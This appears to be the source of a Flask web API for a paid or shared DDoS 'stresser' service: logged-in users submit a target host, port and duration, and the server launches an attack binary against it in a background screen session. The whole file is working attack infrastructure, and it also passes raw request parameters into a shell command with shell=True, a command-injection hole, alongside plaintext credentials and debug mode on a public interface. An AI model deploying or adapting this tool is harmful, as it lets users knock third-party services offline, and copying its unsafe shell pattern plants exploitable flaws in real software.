from flask import Flask, request, jsonify, render_template
import subprocess
import time
import threading
import requests

app = Flask(__name__)

users = {}
active_attacks = {}
blacklist = {}

with open("auth.txt", "r") as file:
    for line in file:
        username, password = line.strip().split(":")
        users[username] = password

def authenticate(username, password):
    return username in users and users[username] == password
      
def send(username, host, port, time):
    command = f"screen -S {username} -dm bash -c 'cd /root/homeholder && ./home {host} {port} {time} 7'"
    
    try:
        subprocess.run(command, shell=True, check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return False

@app.route('/api/attack', methods=['GET'])
def perform_attack():
    username = request.args.get('username')
    password = request.args.get('password')
    host = request.args.get('host')
    port = request.args.get('port')
    time = request.args.get('time')

    if authenticate(username, password):
        if host in blacklist:
            return jsonify({'status': 'error', 'message': 'Blacklisted target :( '})
        if send(username, host, port, time):
            return jsonify({'status': f'Successfully Sent To {host} on port {port} for {time}! ✅'})
        else:
            return jsonify({'status': 'error', 'message': 'User has an active attack'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})


@app.route('/')
def index():
    return render_template('index.html') 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True) # TO SHADOW: debug makes it so if the file is edited it reruns the file btw
